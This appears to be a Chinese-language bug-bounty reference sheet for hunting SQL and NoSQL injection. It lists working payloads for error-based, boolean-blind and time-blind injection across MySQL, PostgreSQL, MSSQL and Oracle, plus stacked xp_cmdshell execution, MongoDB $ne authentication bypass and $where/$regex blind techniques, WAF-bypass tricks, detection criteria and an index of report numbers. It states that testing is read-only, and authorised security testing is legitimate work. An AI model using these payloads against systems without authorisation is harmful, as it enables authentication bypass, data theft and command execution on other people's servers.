# hunt-sqli · 参考

真实报告源自本仓库第二轮高价值案例（value_score≥8）。只做只读证明，不写库、不 dump 真实数据。

## 递进 payload（Bypasses）

### ① 错误型（先判是否进 SQL）
```
'    "    `    ')    ''    \    %27
```
响应出现 SQL 报错（`SQL syntax`/`ORA-`/`PG::`/`SQLSTATE`）= 强信号。

### ② 布尔盲（响应差异）
```
' AND 1=1-- -      vs      ' AND 1=2-- -
1 AND 1=1          vs      1 AND 1=2
' OR '1'='1        （认证/列表场景）
```
两者响应长度/内容稳定不同 = 布尔可控。

### ③ 时间盲（无差异时）
```
MySQL:  ' AND SLEEP(6)-- -        ' OR SLEEP(6)#
PgSQL:  '; SELECT pg_sleep(6)-- -
MSSQL:  '; WAITFOR DELAY '0:0:6'-- -
Oracle: ' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',6)-- -
```
稳定慢 ~6s（中位）= 时间盲注。

### ④ 非常见落点
- **数组键当 SQL 片段**（Drupalgeddon）：`user[0 OR 1=1]`（#31756）。
- **PHP 类型混淆**：数组/科学计数法使弱比较拼进 SQL（#358570、#1065885、#1067912）。
- **排序注入**：`order=id)-- -`、`sort=(select ...)`（列名处无法参数化）。
- **堆叠查询 + xp_cmdshell**：`; EXEC xp_cmdshell(...)`（#1104111，→ 也见 hunt-command-injection）。

### NoSQL（MongoDB 等）
```
query 参数:  user[$ne]=&pass[$ne]=          (认证绕过)
             id[$gt]=0
JSON body:   {"user":{"$ne":null},"pass":{"$ne":null}}
             {"$where":"sleep(6)||true"}    (时间盲, #1130874)
             {"field":{"$regex":"^a"}}      (逐字符盲注, #1130721)
```
- ContentProvider `where` 未过滤（Android，#1650264）。

### WAF 绕过
- 内联注释 `/**/`、`/*!50000...*/`；大小写；`UNION` 拆分；换编码（#1104111 用 `/* */` + 分号堆叠）。
- 参数里加双引号扰乱 WAF 解析（#1760213）。

## Detection Patterns（怎么判，而非猜）

- **报错型**：注入特殊字符后出现数据库报错字符串。
- **布尔型**：`1=1`/`1=2` 两请求响应稳定不同（长度/内容/状态）。
- **时间型**：注入 sleep 后中位时延 ≈ 设定值，基线快；重复≥3 次排抖动。
- **NoSQL**：`[$ne]` 使登录/查询行为改变（返回更多/绕过）。
- 区分"参数校验报错"与"SQL 报错"——只有后者算命中。

## Real Reports（复现索引）

| 类型 | 报告 |
|---|---|
| 数组键 SQL 片段 | 31756 |
| PHP 类型混淆注入 | 358570 / 1065885 / 1067912 |
| WAF 绕过 + 堆叠 xp_cmdshell | 1104111 |
| MongoDB $where/$regex | 1130874 / 1130721 |
| ContentProvider where | 1650264 |
| projection/URI 注入 | 518669 |
| 双引号扰乱 WAF | 1760213 |

hunt 顺序：①错误型快筛 → ②布尔确认可控 → ③时间型兜底（无回显/无差异）→ JSON 入口直接试 NoSQL `$ne`/`$where`。
